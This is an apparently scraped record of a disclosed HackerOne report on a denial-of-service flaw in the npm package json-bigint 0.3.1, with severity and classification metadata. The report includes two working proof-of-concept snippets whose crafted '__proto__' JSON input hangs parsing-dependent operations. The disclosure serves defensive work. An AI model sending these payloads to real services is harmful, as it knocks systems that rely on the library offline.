{
    "reported_to": "Node.js third-party modules",
    "reported_by": "chalker ",
    "title": "[json-bigint] DoS via `__proto__` assignment",
    "content": "\nI would like to report a DoS in json-bigint.\nIt allows to cause denial of service using very limited input (~70 bytes).\nModule\nmodule name: json-bigint\nversion: 0.3.1\nnpm page: https://www.npmjs.com/package/json-bigint\nModule Description\nJSON.parse/stringify with bigints support. Based on Douglas Crockford JSON.js package and bignumber.js library.\nModule Stats\n2 301 424 weekly downloads\nVulnerability\nVulnerability Description\nJson parsing library assigns to __proto__, which can be abused to confuse bignumber.js library, causing a DoS on various operations with the resulting number (stringification, arithmetic) via a very small input (70 bytes).\nSteps To Reproduce:\nCode 176 Bytes\n1const JSONbig = require('json-bigint')\n2const json = '{\"__proto__\":1000000000000000,\"c\":{\"__proto__\":[],\"length\":1e200}}'\n3const r = JSONbig.parse(json)\n4console.log(r.toString())\nNote that the object parsed, but an attempt to convert it to a string (or to do any arithmetic operation on it) will hang.\nDemo with arithmetic operation hanging:\nCode 169 Bytes\n1const JSONbig = require('json-bigint')\n2const json = '{\"__proto__\":1000000000000000,\"c\":{\"__proto__\":[],\"0\":42,\"length\":2}}'\n3const r = JSONbig.parse(json)\n4r.dividedBy(42)\nPatch\nBe careful when assigning to __proto__ value.\nSupporting Material/References:\n[OPERATING SYSTEM VERSION]: Linux xps 5.7.6-arch1-1 #1 SMP PREEMPT Thu, 25 Jun 2020 00:14:47 +0000 x86_64 GNU/Linux\n\nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nImpact\nDenial of service via untrusted input.\n\n",
    "severity": [
        7.5,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "Uncontrolled Resource Consumption"
    ],
    "screenshots": {},
    "disclosed_date": 1598409600,
    "report_url": "https://hackerone.com/reports/916430",
    "is_multi_component": true,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "CODE",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}